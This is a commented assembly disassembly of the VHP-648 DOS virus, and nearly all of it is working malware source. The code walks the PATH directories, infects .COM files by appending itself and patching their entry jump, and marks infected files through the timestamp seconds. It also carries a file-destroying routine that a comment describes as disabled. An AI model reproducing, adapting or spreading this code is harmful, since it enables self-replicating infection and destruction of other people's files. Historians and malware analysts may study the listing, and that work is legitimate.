	name	Virus
	title	Disassembly listing of the VHP-648 virus
	.radix	16
code	segment
	assume	cs:code,ds:code
	org	100
environ equ	2C

start:
	jmp	virus

message db	'Hello, world!$'

	mov	ah,9
	mov	dx,offset message
	int	21
	int	20

virus:
	push	cx		;Save CX

	mov	dx,offset data	;Restore original first instruction
modify	equ	$-2		;The instruction above is changed
				; before each contamination
	cld
	mov	si,dx
	add	si,saveins-data ;Instruction saved there
	mov	di,offset start
	mov	cx,3		;Move 3 bytes
	rep	movsb		;Do it
	mov	si,dx		;Keep SI pointed at data

	mov	ah,30		;Get DOS version
	int	21
	cmp	al,0		;Less than 2.0?
	jne	skip1
	jmp	exit		;Exit if so

skip1:
	push	es		;Save ES
	mov	ah,2F		;Get current DTA in ES:BX
	int	21
	mov	word ptr [si+0],bx	;dtaadr
	mov	word ptr [si+2],es
	pop	es		;Restore ES

	mov	dx,mydta-data
	add	dx,si
	mov	ah,1A		;Set DTA
	int	21

	push	es		;Save ES & SI
	push	si
	mov	es,ds:[environ] ;Environment address
	mov	di,0
n_00015A:			;Search 'PATH=' in the environment
	pop	si		;Restore data offset in SI
	push	si
	add	si,pathstr-data
	lodsb
	mov	cx,8000 	;Maximum 32K in environment
	repne	scasb		;Search for first letter ('P')
	mov	cx,4		;4 letters in 'PATH'
n_000169:
	lodsb			;Search for next char
	scasb
	jne	n_00015A	;If not found, search for next 'P'
	loop	n_000169	;Loop until done
	pop	si		;Restore SI & ES
	pop	es

	mov	[si+16],di	;Save 'PATH' offset in poffs
	mov	di,si
	add	di,fname-data	;Point SI & DI at '=' sign
	mov	bx,si		;Point BX at data area
	add	si,fname-data
	mov	di,si
	jmp	short n_0001BF

n_000185:
	cmp	word ptr [si+16],6C	;poffs
	jne	n_00018F
	jmp	olddta
n_00018F:
	push	ds
	push	si
	mov	ds,es:[environ]
	mov	di,si
	mov	si,es:[di+16]	;poffs
	add	di,fname-data
n_0001A1:
	lodsb
	cmp	al,';'
	je	n_0001B0
	cmp	al,0
	je	n_0001AD
	stosb
	jmp	n_0001A1
n_0001AD:
	mov	si,0
n_0001B0:
	pop	bx
	pop	ds
	mov	[bx+16],si	;poffs
	cmp	byte ptr [di-1],'\'
	je	n_0001BF
	mov	al,'\'          ;Add '\' if not already present
	stosb

n_0001BF:
	mov	[bx+18],di	;Save '=' offset in eqoffs
	mov	si,bx		;Restore data pointer in SI
	add	si,allcom-data
	mov	cx,6		;6 bytes in ASCIIZ '*.COM'
	rep	movsb		;Move '*.COM' at fname
	mov	si,bx		;Restore SI

	mov	ah,4E		;Find first file
	mov	dx,fname-data
	add	dx,si
	mov	cx,11b		;Hidden, Read/Only or Normal files
	int	21
	jmp	short n_0001E3

findnext:
	mov	ah,4F		;Find next file
	int	21
n_0001E3:
	jnc	n_0001E7	;If found, try to contaminate it
	jmp	n_000185	;Otherwise search in another directory

n_0001E7:
	mov	ax,[si+75]	;Check file time
	and	al,11111b	; (the seconds, more exactly)
	cmp	al,62d/2	;Are they 62?

;If so, file is already contains the virus, search for another:

	je	findnext
	cmp	[si+79],64000d	;Is file size greather than 64,000 bytes?
	ja	findnext	;If so, search for next file
	cmp	word ptr [si+79],10d	;Is file size less than 10 bytes?
	jb	findnext	;If so, search for next file

	mov	di,[si+18]	;eqoffs
	push	si		;Save SI
	add	si,namez-data	;Point SI at namez
n_000209:
	lodsb
	stosb
	cmp	al,0
	jne	n_000209

	pop	si		;Restore SI
	mov	ax,4300 	;Get file attributes
	mov	dx,fname-data
	add	dx,si
	int	21

	mov	[si+8],cx	;Save them in fattrib
	mov	ax,4301 	;Set file attributes

;The next `db's are there because MASM can't assemble
; the instruction `and cx,0FFFE' correctly (the fool!):

	db	081,0E1,0FE,0FF
;	and	cx,not 1	;Turn off Read Only flag
	mov	dx,fname-data
	add	dx,si
	int	21

	mov	ax,3D02 	;Open file with Read/Write access
	mov	dx,fname-data
	add	dx,si
	int	21
	jnc	n_00023E
	jmp	oldattr 	;Exit on error

n_00023E:
	mov	bx,ax		;Save file handle in BX
	mov	ax,5700 	;Get file date & time
	int	21
	mov	[si+4],cx	;Save time in ftime
	mov	[si+6],dx	;Save date in fdate

	mov	ah,2C		;Get system time
	int	21
	and	dh,111b 	;Are seconds a multiple of 8?

;If so, destroy file (don't contaminate). Now this code is disabled.

	jmp	short n_000266	;CHANGED. Was jnz here

;Destroy file by rewriting an illegal jmp as first instruction:

	mov	ah,40		;Write to file handle
	mov	cx,5		;Write 5 bytes
	mov	dx,si
	add	dx,bad_jmp-data ;Write THESE bytes
	int	21		;Do it
	jmp	short oldtime	;Exit

;Try to contaminate file:

;Read first instruction of the file (first 3 bytes) and save it in saveins:

n_000266:
	mov	ah,3F		;Read from file handle
	mov	cx,3		;Read 3 bytes
	mov	dx,saveins-data ;Put them there
	add	dx,si
	int	21
	jc	oldtime 	;Exit on error
	cmp	ax,3		;Are really 3 bytes read?
	jne	oldtime 	;Exit if not

;Move file pointer to end of file:

	mov	ax,4202 	;LSEEK from end of file
	mov	cx,0		;0 bytes from end
	mov	dx,0
	int	21
	jc	oldtime 	;Exit on error

	mov	cx,ax		;Get the value of file pointer
	sub	ax,3		;Subtract 3 from it to get real code size
	mov	[si+14d],ax	;Save result in filloc
	add	cx,data-(virus-100)
	mov	di,si
	sub	di,data-modify	;A little self-modification
	mov	[di],cx

	mov	ah,40		;Write to file handle
	mov	cx,enddata-virus  ;Virus code length as bytes to be written
	mov	dx,si
	sub	dx,data-virus	;Now DX points at virus label
	int	21
	jc	oldtime 	;Exit on error
	cmp	ax,enddata-virus	;Are all bytes written?
	jne	oldtime 	;Exit if not

	mov	ax,4200 	;LSEEK from the beginning of the file
	mov	cx,0		;Just at the file beginning
	mov	dx,0
	int	21
	jc	oldtime 	;Exit on error

;Rewrite the first instruction of the file with a jump to the virus code:

	mov	ah,40		;Write to file handle
	mov	cx,3		;3 bytes to write
	mov	dx,si
	add	dx,newjmp-data	;Write THESE bytes
	int	21

oldtime:
	mov	dx,[si+6]	;Restore file date
	mov	cx,[si+4]	; and time

;And these again are due to the MASM 5.0 foolness:

	db	081,0E1,0E0,0FF
	db	081,0C9,01F,000
;	and	cx,not 11111b
;	or	cx,11111b	;Set seconds to 62 (?!)

	mov	ax,5701 	;Set file date & time
	int	21
	mov	ah,3E		;Close file handle
	int	21

oldattr:
	mov	ax,4301 	;Set file attributes
	mov	cx,[si+8]	;They were saved in fattrib
	mov	dx,fname-data
	add	dx,si
	int	21

olddta:
	push	ds		;Save DS
	mov	ah,1A		;Set DTA
	mov	dx,[si+0]	;Restore saved DTA
	mov	ds,[si+2]
	int	21
	pop	ds		;Restore DS

exit:
	pop	cx		;Restore CX
	xor	ax,ax		;Clear registers
	xor	bx,bx
	xor	dx,dx
	xor	si,si
	mov	di,100		;Jump to CS:100
	push	di		; by doing funny RET
	xor	di,di
	ret	-1

data	label	byte		;Data section
dtaaddr dd	?		;Disk Transfer Address
ftime	dw	?		;File date
fdate	dw	?		;File time
fattrib dw	?		;File attribute
saveins db	0EBh,0Fh,90	;Original first 3 bytes
newjmp	db	0E9		;Code of jmp instruction
filloc	dw	?		;File pointer is saved here
allcom	db	'*.COM',0       ;Filespec to search for
poffs	dw	?		;Address of 'PATH' string
eqoffs	dw	?		;Address of '=' sign
pathstr db	'PATH='
fname	db	40 dup (' ')    ;Path name to search for

;Disk Transfer Address for Find First / Find Next:

mydta	label	byte
drive	db	?		;Drive to search for
pattern db	13d dup (?)	;Search pattern
reserve db	7 dup (?)	;Not used
attrib	db	?		;File attribute
time	dw	?		;File time
date	dw	?		;File date
fsize	dd	?		;File size
namez	db	13d dup (?)	;File name found

;This replaces the first instruction of a destroyed file:

bad_jmp db	0EA,0Bh,2,13,58
enddata label	byte

code	ends
	end	start
